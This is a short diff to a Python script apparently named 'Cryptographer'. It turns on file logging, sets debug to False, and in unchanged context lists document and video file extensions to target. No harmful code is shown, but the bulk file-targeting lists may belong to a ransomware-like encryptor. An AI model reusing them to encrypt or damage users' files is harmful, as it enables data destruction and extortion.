@@ -11,22 +11,22 @@ logger = logging.getLogger(__name__)
 logger.setLevel(logging.INFO)
 fmt = logging.Formatter('[%(levelname)s] %(asctime)s - %(name)s - %(message)s')
 
-# # fileHandler config
-# fileHandler = logging.FileHandler('Cryptographer.log')
-# fileHandler.setLevel(logging.INFO)
-# fileHandler.setFormatter(fmt)
-# logger.addHandler(fileHandler)
+# fileHandler config
+fileHandler = logging.FileHandler('Cryptographer.log')
+fileHandler.setLevel(logging.INFO)
+fileHandler.setFormatter(fmt)
+logger.addHandler(fileHandler)
+with open('Cryptographer.log', 'w') as f:
+    f.write('')
 
 # streamHandler config
-debug = True
+debug = False
 if debug is True:
     streamHandler = logging.StreamHandler()
     streamHandler.setFormatter(fmt)
     streamHandler.setLevel(logging.DEBUG)
     logger.addHandler(streamHandler)
 
-with open('Cryptographer.log', 'w') as f:
-    f.write('')
 
 textFiles = '*.txt', '*.doc', '*.docx', '*.log', '*.msg', '*.odt', '*.pages', '*.rtf', '*.tex', '*.wpd', '*.wps'
 videoFiles = '*.mp4', '*.mov', '*.avi', '*.flv', '*.mkv', '*.wmv', '*.avchd', '*.webm', '*MPEG-4', '*.H.264'
